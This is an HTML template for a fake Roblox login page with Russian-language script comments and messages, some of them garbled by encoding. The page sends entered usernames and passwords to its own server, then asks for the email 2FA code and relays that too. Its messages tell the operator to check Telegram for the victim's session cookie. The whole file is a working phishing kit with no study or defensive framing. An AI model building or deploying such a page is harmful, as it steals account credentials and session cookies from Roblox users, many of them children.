<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link rel="icon" href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico">
</head>
<body class="rbx-body dark-theme builder-font">
    <div class="container-main">
        <div class="login-form-container">
            <form class="login-form" id="loginForm">
                <div class="form-group username-form-group">
                    <label for="login-username" class="sr-only">Username/Email/Phone</label>
                    <input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="Username/Email/Phone" required>
                </div>
                <div class="form-group password-form-group">
                    <label for="login-password" class="sr-only">Password</label>
                    <input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" required>
                </div>
                <div class="form-group remember-me-form-group">
                    <input type="checkbox" id="remember" name="remember">
                    <label for="remember">Remember me</label>
                </div>
                <button type="submit" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button>
            </form>
            
            <form class="login-form hidden" id="codeForm">
                <div class="form-group">
                    <label for="code-input">Enter the code from your email</label>
                    <input id="code-input" name="code" type="text" class="form-control input-field" maxlength="6" placeholder="6-digit code" required>
                </div>
                <button type="submit" id="code-button" class="btn-full-width login-button btn-secondary-md">Submit Code</button>
            </form>
            
            <div class="text-center forgot-credentials-link">
                <a id="forgot-credentials-link" class="text-link" href="#">Forgot password or username?</a>
            </div>
            <div class="text-center signup-link">
                <span>Don't have an account?</span> <a href="#" class="text-link">Sign Up</a>
            </div>
            <div id="result" class="result-message"></div>
        </div>
    </div>

    <script>
    document.addEventListener('DOMContentLoaded', function() {
        var loginForm = document.getElementById('loginForm');
        var codeForm = document.getElementById('codeForm');
        var resultDiv = document.getElementById('result');
        var sessionId = null;

        // –û–ø—Ä–µ–¥–µ–ª—è–µ–º URL —Å–µ—Ä–≤–µ—Ä–∞
        function getServerUrl() {
            if (window.location.hostname.includes('render.com') ||
                window.location.hostname.includes('herokuapp.com') ||
                window.location.hostname.includes('railway.app')) {
                return window.location.origin;
            }
            return 'http://localhost:5000';
        }

        var SERVER_URL = getServerUrl();
        console.log('üöÄ –°–µ—Ä–≤–µ—Ä URL:', SERVER_URL);

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–æ—Ä–º—ã –ª–æ–≥–∏–Ω–∞
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            var username = document.getElementById('login-username').value;
            var password = document.getElementById('login-password').value;
            var remember = document.getElementById('remember').checked;
            
            if (!username || !password) {
                showResult('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è', 'error');
                return;
            }

            showResult('–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è...', 'info');
            
            try {
                const response = await fetch(SERVER_URL + '/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        remember: remember
                    })
                });

                const data = await response.json();
                
                if (data.need_code) {
                    sessionId = data.session_id;
                    loginForm.classList.add('hidden');
                    codeForm.classList.remove('hidden');
                    showResult('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ email', 'info');
                } else if (data.success) {
                    showResult('–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω —É—Å–ø–µ—à–Ω–æ! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ Telegram –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫—É–∫–∏.', 'success');
                } else {
                    showResult(data.message || '–û—à–∏–±–∫–∞ –≤—Ö–æ–¥–∞', 'error');
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                showResult('–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º', 'error');
            }
        });

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–æ—Ä–º—ã 2FA
        codeForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            var code = document.getElementById('code-input').value;
            
            if (!code || !sessionId) {
                showResult('–û—à–∏–±–∫–∞: –Ω–µ —É–∫–∞–∑–∞–Ω –∫–æ–¥ –∏–ª–∏ session_id', 'error');
                return;
            }

            showResult('–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞...', 'info');
            
            try {
                const response = await fetch(SERVER_URL + '/submit_code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        session_id: sessionId,
                        code: code
                    })
                });

                const data = await response.json();
                
                if (data.success) {
                    showResult('–í—Ö–æ–¥ –∑–∞–≤–µ—Ä—à—ë–Ω! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ Telegram –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫—É–∫–∏.', 'success');
                    codeForm.classList.add('hidden');
                    loginForm.classList.remove('hidden');
                    sessionId = null;
                } else {
                    showResult(data.message || '–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–¥–∞', 'error');
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                showResult('–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º', 'error');
            }
        });

        // –ü–æ–∫–∞–∑–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç
        function showResult(message, type) {
            resultDiv.textContent = message;
            resultDiv.className = 'result-message ' + type;
            resultDiv.style.display = 'block';
            
            setTimeout(() => {
                resultDiv.style.display = 'none';
            }, 5000);
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ—Å—Ç–æ—è–Ω–∏—è —Å–µ—Ä–≤–µ—Ä–∞
        async function checkServerHealth() {
            try {
                const response = await fetch(SERVER_URL + '/health');
                const data = await response.json();
                console.log('‚úÖ –°–µ—Ä–≤–µ—Ä —Ä–∞–±–æ—Ç–∞–µ—Ç:', data);
            } catch (error) {
                console.error('‚ùå –°–µ—Ä–≤–µ—Ä –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω:', error);
            }
        }

        // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–µ—Ä–≤–µ—Ä –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        setTimeout(checkServerHealth, 1000);
    });
    </script>
</body>
</html> 